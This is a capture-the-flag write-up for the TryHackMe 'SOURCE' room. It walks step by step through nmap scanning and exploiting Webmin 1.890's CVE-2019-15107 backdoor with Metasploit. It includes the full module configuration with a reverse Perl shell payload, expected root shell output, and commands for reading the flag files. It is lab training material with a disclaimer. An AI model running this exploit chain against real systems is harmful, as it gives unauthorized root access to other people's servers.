🎯 TryHackMe - SOURCE
Room: SOURCE
Platform: TryHackMe
Difficulty: Easy
Category: Exploitation - Webmin / Metasploit
Creator: DarkStar7471

TryHackMe
Difficulty
OS
Status

📖 Overview
SOURCE is a classic Easy room to practice real exploitation with Metasploit.

The target runs an old, vulnerable version of Webmin 1.890 with the famous backdoor CVE-2019-15107.

The full path is:

Enumeration - Nmap
Research - Searchsploit / CVE-2019-15107
Exploitation - Metasploit linux/http/webmin_backdoor
Root Access - The exploit gives you root directly
Flags - user.txt + root.txt
No PrivEsc needed here - if you configure LHOST and SSL correctly, you land as root.

🛠️ Tools Used
Tool	Usage
nmap	Port scanning & Version detection
searchsploit	Search for Webmin exploit
msfconsole	Metasploit Framework
Kali Linux	Attack Machine
🔍 Walkthrough
1. Connect & Check
Make sure VPN is connected:

ip a | grep tun
ping -c 3 <TARGET_IP>
Your VPN IP will be on tun0 / tun1 - e.g. 192.168.154.142 - this is your LHOST.

2. Enumeration - Nmap
nmap -sV -sC -Pn <TARGET_IP>
Open Ports Found:

10000/tcp - Webmin - MiniServ 1.890 - Webmin 1.890
This version is vulnerable to CVE-2019-15107.

3. Search for Exploit
searchsploit webmin 1.890
Result: linux/http/webmin_backdoor in Metasploit.

4. Metasploit - Exploitation
msfconsole
search webmin
use exploit/linux/http/webmin_backdoor
options
The 2 settings that break everyone in this room:
1. SSL must be true
Webmin on port 10000 runs on https, not http. If you forget this, you get:

Please enable the SSL option to proceed
Cannot reliably check exploitability.
2. LHOST must be your tun IP, NOT your VMware IP
If you put 192.168.240.128 (eth0 / VMware) you will get:

Exploit completed, but no session was created.
Because the target can't reach your VMware IP, it can only reach your VPN IP.

Correct Configuration:
set RHOSTS <TARGET_IP>
set RPORT 10000
set SSL true
set TARGETURI /

set payload cmd/unix/reverse_perl
set LHOST <YOUR_TUN_IP>  # e.g. 192.168.154.142
set LPORT 4444

check
exploit
Expected output:

[+] The target is vulnerable.
[*] Started reverse TCP handler on <YOUR_TUN_IP>:4444
[*] Command shell session 1 opened
5. Verify Access
whoami
# Output: root
id
# Output: uid=0(root) gid=0(root)
pwd
You are root already!

6. Flags
# user.txt
ls -la /home/
cat /home/*/user.txt
find / -name user.txt 2>/dev/null

# root.txt
ls -la /root/
cat /root/root.txt
🚩 Flags
Flag	Location
user.txt	/home/<user>/user.txt
root.txt	/root/root.txt
⚠️ Flags are redacted from this repo. Replace with your own flags after completing the room.

🐛 Common Errors & Fixes
Error	Cause	Fix
ENOTCONN - getpeername	Connection dropped / SSL not enabled	set SSL true
Cannot reliably check exploitability	Metasploit trying HTTP on HTTPS service	set SSL true
Exploit completed, but no session was created	Wrong LHOST (VMware IP)	set LHOST <tun0/tun1 IP>
Started reverse TCP handler on 192.168.240.128	LHOST = eth0	Change to tun IP
🧠 Key Learnings
Always check service version - Webmin 1.890 = CVE-2019-15107
SSL matters - Port 10000 Webmin = HTTPS. Metasploit needs SSL true.
LHOST = VPN IP - In TryHackMe, always use tun0 / tun1 IP, never eth0 / VMware NAT IP.
Use check first - If it says The target is vulnerable, your config is right.
Try other payloads - If reverse_perl fails, try reverse_bash or reverse_python.
🔗 References
Room: https://tryhackme.com/r/room/source
CVE-2019-15107 - Webmin Backdoor RCE
Metasploit Module: exploit/linux/http/webmin_backdoor
GTFOBins: https://gtfobins.github.io/
👨‍💻 Author
Ahmed Ashraf

TryHackMe Labs & CTF Writeups
Focus: Penetration Testing / Metasploit / Linux PrivEsc
This writeup is for educational purposes only in an authorized lab environment. Do not use these techniques on systems you don't own or don't have permission to test.

